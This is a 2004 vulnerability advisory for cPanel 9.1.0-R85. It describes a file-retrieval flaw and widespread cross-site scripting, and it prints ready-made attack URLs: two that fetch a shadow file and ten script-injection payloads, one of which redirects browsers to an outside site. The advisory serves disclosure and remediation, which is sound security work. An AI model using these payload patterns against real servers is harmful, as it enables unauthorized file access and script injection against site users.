## Product:
cpanel.net cPanel Web Host Control Panel

## Released:
03/13/2004

# Remote File Include
## Description:
cPanel 9.1.0-R85 is vulnerable to a remote file retrieval vulnerability.

## Systems Affected:
cPanel 9.1.0-R85

## Technical Description:
Two cPanel programs allow remote users to specify arbitrary files to retrieve from the server. Risk is mitigated because users can only retrieve files from within their user directory. This poses a risk if the administrator has removed the "File Manager" module (note: disabling "File Manager" in WHM only removes the icon from the cPanel front page, not from the webserver entirely), as the user may be able to access files they would otherwise not have the ability to read.

These URLs will retrieve the shadow file from the user's /etc directory (not the system's /etc directory):

- http://[victim]/frontend/x/cpanelpro/editmsg.html?emaildir=/etc&form=shadow
- http://[victim]/frontend/x2/err/erredit.html?dir=/etc&file=shadow

# XSS
## Description:
cPanel 9.1.0-R85 is vulnerable to Cross Site Scripting (XSS) in almost every field which is returned to the browser. This could allow a user to create a specially crafted URL that would execute arbitrary code in a user's browser within the trust relationship between the browser and the server, leading to a loss of integrity.

cPanel supports filtering of HTML and scripts in input variables, but according to cPanel was not enabled in order to support third-party themes. In the interest of properly securing cPanel, the developers have decided to enable HTML filtering as of the first release in the April 1, 2004 EDGE release.

## Technical Description:
Multiple variables in multiple cPanel programs do not filter user supplied input. This could allow an attacker to perform Cross Site Scripting (XSS) attacks against users of the cPanel system.

To check cPanel for CSS, simply access the following example URLs in a browser:

- http://[victim]/frontend/x/cpanelpro/ignorelist.html?account="><script>alert('Vulnerable')</script>
- http://[victim]/frontend/x/cpanelpro/showlog.html?account=<script>alert('Vulnerable')</script>
- http://[victim]/frontend/x/sql/repairdb.html?db=<script>alert('Vulnerable')</script>
- http://[victim]/frontend/x/ftp/doaddftp.html?login="><script>alert('Vulnerable')</script>
- http://[victim]/frontend/x/cpanelpro/editmsg.html?account="><script>alert('Vulnerable')</script>
- http://[victim]/frontend/x/testfile.html?email=<script>alert('Vulnerable')</script>
- http://[victim]/frontend/x2/err/erredit.html?dir=public_html/&file=<script>alert('Vulnerable')</script>
- http://[victim]/frontend/x2/net/dnslook.html?dns=</pre><script>window.location='http://www.cirt.net/'</script>
- http://[victim]/frontend/x2/denyip/del.html?ip=<script>alert('Vulnerable')</script>
- http://[victim]/frontend/x2/htaccess/index.html?dir=<script>alert('Vulnerable')</script>

## Fix/Workaround:
Upgrade to the April 1, 2004 EDGE release or newer.

## Vendor Status:
cPanel was contacted on 3/13/2004. Vendor responded on 3/16/2004 that this was not an issue since "File Manager" cannot be disabled.

## References:
- OSVDB-4216	cPanel erredit.html Arbitrary File Access
- OSVDB-4217	cPanel editmsg.html Arbitrary File Access
